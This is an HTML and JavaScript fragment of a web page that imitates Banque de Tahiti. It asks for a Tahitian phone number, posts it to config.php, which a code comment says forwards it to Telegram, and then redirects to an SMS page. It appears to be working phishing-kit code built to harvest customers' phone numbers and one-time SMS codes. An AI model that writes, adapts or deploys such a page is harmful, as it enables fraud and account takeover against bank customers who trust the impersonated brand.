        <div class="phone-input-wrapper">
            <span class="country-code">+689</span>
            <input type="tel" id="phoneNumber" class="phone-input" placeholder="87 12 34 56" autocomplete="off" inputmode="numeric">
        </div>

    </div>

        <a href="javascript:history.back()">← Retour</a>

            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">

<script>
    const phoneInput = document.getElementById('phoneNumber');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    const contactBtn = document.getElementById('contactBtn');

    // Nettoyer l'entrée : ne garder que les chiffres
    function cleanNumber(input) {
        return input.replace(/\D/g, '');
    }

    // Vérifier que le numéro fait exactement 8 chiffres
    function isValidPhone(raw) {
        const digits = cleanNumber(raw);
        return digits.length === 8;
    }

    // Afficher/masquer le message d'erreur
    function showError(show) {
        errorMsg.style.display = show ? 'block' : 'none';
    }

    // Mettre à jour l'état du bouton
    function updateButtonState() {
        const rawValue = phoneInput.value.trim();
        const valid = isValidPhone(rawValue);
        submitBtn.disabled = !valid;
        if (valid) showError(false);
    }

    // Formatage automatique avec espaces tous les 2 chiffres
    function formatPhoneNumber(e) {
        let digits = cleanNumber(phoneInput.value);
        if (digits.length > 8) digits = digits.slice(0, 8);
        let formatted = '';
        for (let i = 0; i < digits.length; i++) {
            if (i > 0 && i % 2 === 0) formatted += ' ';
            formatted += digits[i];
        }
        phoneInput.value = formatted;
        updateButtonState();
    }

    // Soumission du formulaire avec envoi à Telegram
    async function onSubmit(e) {
        e.preventDefault();
        const rawValue = phoneInput.value.trim();
        if (!isValidPhone(rawValue)) {
            showError(true);
            return;
        }
        const fullNumber = '+689' + cleanNumber(rawValue);

        // Envoi du numéro à config.php
        try {
            const response = await fetch('config.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'type=numero&value=' + encodeURIComponent(fullNumber)
            });
            const result = await response.json();

            if (result.status === 'success') {
                sessionStorage.setItem('userPhone', fullNumber);
                window.location.href = 'sms.html';
            } else {
                alert('Erreur lors de l’envoi du numéro. Veuillez réessayer.');
            }
        } catch (err) {
            alert('Erreur réseau. Vérifiez votre connexion.');
        }
    }

    phoneInput.addEventListener('input', formatPhoneNumber);
    submitBtn.addEventListener('click', onSubmit);

    if (contactBtn) {
        contactBtn.addEventListener('click', function() {
            alert("Besoin d'aide ? Contactez votre conseiller Banque de Tahiti au +689 40 46 46 46\nou consultez votre agence en ligne.");
        });
    }

    updateButtonState();
</script>
